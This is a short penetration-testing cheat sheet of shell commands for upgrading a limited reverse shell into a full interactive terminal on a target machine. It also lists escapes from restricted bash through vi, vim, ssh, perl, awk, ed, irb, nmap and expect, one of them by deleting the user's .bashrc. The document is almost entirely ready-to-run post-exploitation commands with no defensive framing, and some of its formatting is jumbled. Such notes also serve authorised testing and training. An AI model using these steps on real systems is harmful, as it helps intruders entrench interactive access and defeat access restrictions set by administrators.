
# Shell upgrades
```bash
# ol reliable
/usr/bin/script -qc /bin/bash /dev/null
```

```bash
# Spawn Python shell
python -c 'import pty; pty.spawn("/bin/bash")'
# Background the shell
Ctrl + Z
# Get current Rows and Columns
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
# Bring shell back to the foreground
stty raw -echo; fg
# Set size for the remote shell 
# (where ROWS and COLS are the values from the 3rd command)
stty rows ROWS cols COLS
# Add some colours
export TERM=xterm-256color
# Reload bash to apply the TERM variable
exec /bin/bash
```

```bash
**Is this rbash** (_Restricted Bash_)**?** PT1  
vi  
:set shell=/bin/sh  
:shell  
  
vim  
:set shell=/bin/sh  
:shell  
  
**Is this rbash** (_Restricted Bash_)**?** PT2  
(_This requires ssh user-level access_)  
ssh user@127.0.0.1 "/bin/sh"  
rm $HOME/.bashrc  
exit  
ssh user@127.0.0.1  
(_Bash Shell_)

**Is python present on the target machine?**  
python -c 'import pty; pty.spawn("/bin/bash")'  
python -c 'import pty; pty.spawn("/bin/sh")'

**Is perl present on the target machine?**  
perl -e 'exec "/bin/bash";'  
perl -e 'exec "/bin/sh";'

**Is AWK present on the target machine?**  
awk 'BEGIN {system("/bin/bash -i")}'  
awk 'BEGIN {system("/bin/sh -i")}'

**Is ed present on the target machines?**  
ed  
!sh

**IRB Present on the target machine?**  
exec "/bin/sh"

**Is Nmap present on the target machine?**  
nmap --interactive  
nmap> !sh

**Expect:**
expect -v expect version 5.45.4
  
$ cat > /tmp/shell.sh <<EOF
#!/usr/bin/expect
spawn bash
interact
EOF
```
